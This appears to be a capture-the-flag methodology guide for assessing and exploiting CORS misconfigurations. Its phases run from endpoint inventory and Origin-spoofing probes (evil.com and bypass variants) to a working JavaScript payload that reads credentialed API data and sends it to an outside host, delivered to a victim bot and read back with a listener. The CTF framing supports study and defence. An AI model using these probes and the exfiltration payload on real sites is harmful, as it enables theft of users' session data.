# Methodology — the CORS assessment, ordered and bounded

The systematic procedure — from 'is this a CORS target' to a solved
flag or a measured closure.

---

## Phase 0 — the scope check

```text
is the target a web app with a session + an API + a read-sensitive
endpoint? is there a bot/victim to read under? a CORS challenge
needs all three: the data, the reader, the delivery.
```

## Phase 1 — the endpoint inventory (5 commands)

```bash
# the session-data endpoints
for ep in /api/me /api/flag /api/user /api/profile /api/token /api/admin; do
  curl -s -o /dev/null -w "$ep %{http_code}\n" -b "$CJ" "$BASE$ep"; done
# the front-end's own API calls
curl -s "$BASE/" | grep -oE '/api/[a-z_-]+' | sort -u
# the flag specifically
curl -s -b "$CJ" "$BASE/api/me" | grep -iE 'flag|secret|FLAG'
```

## Phase 2 — the CORS measurement (the central probe)

```bash
# the Origin replay — ACAO + ACAC
curl -s -i -b "$CJ" "$BASE/api/me" -H 'Origin: https://evil.com' | \
  grep -iE 'access-control-(allow-origin|allow-credentials)'
# the verdict:
#   reflected+ACAC → credentialed read — proceed
#   * (any)        → public — a different target or a pivot
#   null+ACAC      → opaque-origin read — proceed
#   fixed          → closed — the bypass battery
#   absent         → not CORS — a different class
```

## Phase 3 — the credential check

```bash
# does the session cookie ride
curl -s -i -b "$CJ" "$BASE/" | grep -i 'set-cookie'
#   SameSite=None; Secure → attaches; else → non-credentialed
```

## Phase 4 — the check-shape battery (when not open)

```bash
TD=$(echo "$BASE" | sed -E 's#https?://([^/:]+).*#\1#')
for o in 'null' "https://${TD}.evil.com" "https://evil${TD}" \
         "https://sub.${TD}" "https://${TD}@evil.com" \
         'https://evil.com'; do
  echo -n "$o => "
  curl -s -i -b "$CJ" "$BASE/api/me" -H "Origin: $o" | \
    grep -i 'access-control-allow-origin'; done
```

## Phase 5 — the exploit build

```html
<!-- the page matched to the measured shape -->
<script>
fetch('https://t/api/me',{credentials:'include'})
 .then(r=>r.json())
 .then(d=>fetch('https://a/?d='+btoa(JSON.stringify(d))))
 .catch(e=>fetch('https://a/?err='+e))
</script>
```

## Phase 6 — the delivery

```bash
# the bot endpoint — the page reaches the victim
curl -X POST "$BASE/report" -d 'url=https://attacker/page'
# a data: URL for an airgapped/null-origin case
```

## Phase 7 — the readback + the flag

```bash
python3 tools/web/oob_listener.py hits
# the exfil hit → decode → the flag
python3 tools/hooks.py pre-flag --value 'FLAG{...}' --source '<the hit>' --evidence '<the bytes>'
```

## Phase 8 — the negative path — measured closure

```text
each gate that held → a refutes with evidence:
- 'ACAO fixed-allowlist, no bypass' 
- 'ACAC absent — non-credentialed'
- 'SameSite=Lax — cookie doesn't ride'
- 'no alternate-read channel — CORS surface dead'
→ the kill-map: every layer measured, with its reopen precondition
```

## The budget — the bounded sweep

```text
5 probes or 15 min per mechanism class; 25 or 45 for the challenge.
a CORS challenge's sweep: the inventory, the measurement, the
credential check, the battery, the build, the delivery, the
readback — each a bounded probe, not an unbounded hunt.
```

## The ledger — the methodology's record

```bash
python3 tools/state.py <c> --hypothesis \
  "cors-method: <phase> -> <measurement> -> <verdict>"
```
